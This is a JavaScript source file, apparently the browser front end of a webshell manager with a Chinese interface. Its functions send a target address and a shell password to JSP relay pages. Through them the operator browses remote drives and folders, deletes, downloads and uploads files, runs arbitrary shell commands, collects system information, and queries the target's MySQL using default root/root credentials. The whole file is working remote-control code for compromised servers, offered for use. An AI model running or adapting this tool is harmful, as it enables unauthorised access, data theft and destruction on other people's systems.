function sleep(delay) 
	{
		var start = (new Date()).getTime();
		while ((new Date()).getTime() - start < delay) {
			continue;
		}
	}
	function syspan()
		{
			document.getElementById("content").innerHTML="<input id=\"i1\" type=\"hidden\" /><input id=\"i2\" type=\"hidden\" /><div id=\"d1\"></div><div id=\"d3\"></div><div id=\"d2\"></div>";
			var xmlhttp;
			if(window.XMLHttpRequest)
			{
				xmlhttp = new XMLHttpRequest();
			}
			else
			{
				xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange=function()
			{
				if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
				{
					document.getElementById("d1").innerHTML=xmlhttp.responseText;
				}
			}
			xmlhttp.open("POST",uri+"source/syspan.jsp",true);
			xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
			xmlhttp.send("url="+ip+"&password="+password+"&flag=1");
		}
	function getmulu(obj)
	{
		document.getElementById("d3").innerHTML="<input id=\"i3\" value=\"\" /><button id=\"b3\" type=\"button\" onclick=\"backup()\">返回上一页</button><button id=\"b3\" type=\"button\" onclick=\"update_pan()\">更新盘符</button><button id=\"b3\" type=\"button\" onclick=\"update_mulu()\">更新目录</button><button id=\"b3\" type=\"button\" onclick=\"update_file()\">更新文件</button>";
		var hi = document.getElementById("i1");
		hi.value = obj.innerText;
		var path = hi.value.substr(0,3);
		hi.value = path;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("d2").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/scandir.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&dir="+encodeURI(encodeURI(path))+"&password="+password+"&flag=1");
	}
	function getfile(obj)
	{
		var hi = document.getElementById("i1");
		var i2 = document.getElementById("i2");
		i2.value = hi.value;
		hi.value = hi.value + obj.id;
		var path = hi.value.replace(/\s/g,"");
		hi.value = path;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("d2").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/scandir.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&dir="+path+"&password="+password+"&flag=1");
	}
	function remove(obj)
	{
		var hi = document.getElementById("i1");
		var path = hi.value + obj.id;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			var i3 = document.getElementById("i3");
			i3.value = xmlhttp.responseText;
		}
		xmlhttp.open("POST",uri+"source/file.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&path="+path+"&action=del");
	}
	function dowload(obj)
	{
		var hi = document.getElementById("i1");
		var path = hi.value + obj.id;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			var i3 = document.getElementById("i3");
			i3.value = xmlhttp.responseText;
		}
		xmlhttp.open("POST",uri+"source/file.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&path="+path+"&action=dowload");
		sleep(3000);
		self.location.href=uri+"source/file_dowload.jsp?name="+obj.id;
	}
	function backup()
	{
		var i1 = document.getElementById("i1");
		var i2 = document.getElementById("i2");
		var path = i2.value.replace(/\s/g,"");
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("d2").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/scandir.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&dir="+path+"&password="+password+"&flag=1");
		i1.value = path;
	}
	function update_pan()
	{
		document.getElementById("content").innerHTML="<input id=\"i1\" type=\"hidden\" /><input id=\"i2\" type=\"hidden\" /><div id=\"d1\"></div><div id=\"d3\"></div><div id=\"d2\"></div>";
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("d1").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/syspan.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&flag=0");
	}
	function update_mulu()
	{
		document.getElementById("d3").innerHTML="<input id=\"i3\" value=\"\" /><button id=\"b3\" type=\"button\" onclick=\"backup()\">返回上一页</button><button id=\"b3\" type=\"button\" onclick=\"update_pan()\">更新盘符</button><button id=\"b3\" type=\"button\" onclick=\"update_mulu()\">更新目录</button><button id=\"b3\" type=\"button\" onclick=\"update_file()\">更新文件</button>";
		var ii = document.getElementById("i1");
		var path = ii.value.substr(0,3);
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("d2").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/scandir.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&dir="+encodeURI(encodeURI(path))+"&password="+password+"&flag=0");
	}
	function update_file()
	{
		var hi = document.getElementById("i1");
		var path = hi.value.replace(/\s/g,"");
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("d2").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/scandir.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&dir="+path+"&password="+password+"&flag=0");
	}
	function BrowseFolder()
	{
		document.getElementById("content").innerHTML="<form id=\"from1\" onsubmit=\"return submitForm()\" action=\"" + uri + "source/upload.jsp\" method=\"post\" enctype=\"multipart/form-data\">请选择要上传的文件<input id=\"i6\" type=\"file\" name=\"upfile\" size=\"50\"><input id=\"i6\" type=\"submit\" value=\"提交至服务器\"></form><div id=\"upload_flag\"></div><div id=\"upfile\">上传到路径:<input value=\"E:/\" id=\"upload\" type=\"text\"><button id=\"b6\" onclick=\"upfile()\">上传</button></div><div id=\"mark\"><div>";
	}
	function upfile()
	{
		message_up = message_up.replace(/\s/g,"");
		filename_2 = document.getElementById("upload").value;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("mark").innerHTML=xmlhttp.responseText.replace(/\s/g,"");
			}
		}
		xmlhttp.open("POST",uri+"source/upfile.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("f1="+message_up+"&f2="+filename_2+"&url="+ip+"&password="+password);
	}
	function changebgc(x)
	{
		x.style.background = "lavender";
	}
	function backbgc(x)
	{
		x.style.background = "black";
	}
	function loadcmd()
	{
		var inputdom = document.getElementById("cmds");
		var cmds = inputdom.value;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("xianshi").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/cmd.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&cmd="+cmds);
	}
	function getcmd()
	{
		document.getElementById("content").innerHTML="<input id=\"cmds\" class=\"clo\" type=\"text\"/><button type=\"button\" value=\"执行\" onclick=\"loadcmd()\" class=\"buttoncss\">执行</button><div id=\"xianshi\"></div>"
	}
	function systeminfo()
	{
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("content").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/systeminfo.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&flag=1");
	}
	function update_info()
	{
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("content").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/systeminfo.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&flag=0");
	}
	function sql()
	{
		var con = document.getElementById("content");
		con.innerHTML = "<div id=\"v1\"></div><div id=\"v2\"></div>";
		var d4 = document.getElementById("v1");
		d4.innerHTML = "<table border=\"1\" id=\"t2\"><tr><td id=\"d4\">数据库类型</td><td id=\"d5\"><input class=\"i4\" value=\"mysql\"/></td></tr><tr><td id=\"d4\">主机地址</td><td id=\"d5\"><input id=\"n1\" class=\"i4\" value=\"localhost\"/></td></tr><tr><td id=\"d4\">端口</td><td id=\"d5\"><input id=\"n2\" class=\"i4\" value=\"3306\"/></td></tr><tr><td id=\"d4\">数据库名</td><td id=\"d5\"><input id=\"n3\" class=\"i4\" value=\"information_schema\"/></td></tr><tr><td id=\"d4\">用户名</td><td id=\"d5\"><input id=\"n4\" class=\"i4\" value=\"root\"/></td></tr><tr><td id=\"d4\">密码</td><td id=\"d5\"><input id=\"n5\" class=\"i4\" value=\"root\"/></td></tr><tr><td id=\"d4\">sql语句</td><td id=\"d5\"><input id=\"i5\"/>  <button onclick=\"schema()\" class=\"b\">执行</button></td></tr></table>";
	}
	function schema()
	{
		var port = document.getElementById("n2").value;
		var dbname = document.getElementById("n3").value;
		var user = document.getElementById("n4").value;
		var pw = document.getElementById("n5").value;
		var sql = document.getElementById("i5").value;
		var xmlhttp;
		if(window.XMLHttpRequest)
		{
			xmlhttp = new XMLHttpRequest();
		}
		else
		{
			xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		}
		xmlhttp.onreadystatechange=function()
		{
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				document.getElementById("v2").innerHTML=xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST",uri+"source/mysql.jsp",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("url="+ip+"&password="+password+"&user="+user+"&pw="+pw+"&dbname="+dbname+"&port="+port+"&sql="+sql);
	}
	function init()
	{
		var attr = ip.split("/");
		var uri = attr[2];
		var flag = ip.indexOf(":");
		var url = "";
		if(flag != -1)
		{
			var list = uri.split(":");
			url = list[0];
		}
		document.getElementById("setwidth_1").innerHTML=url;
		systeminfo();
	}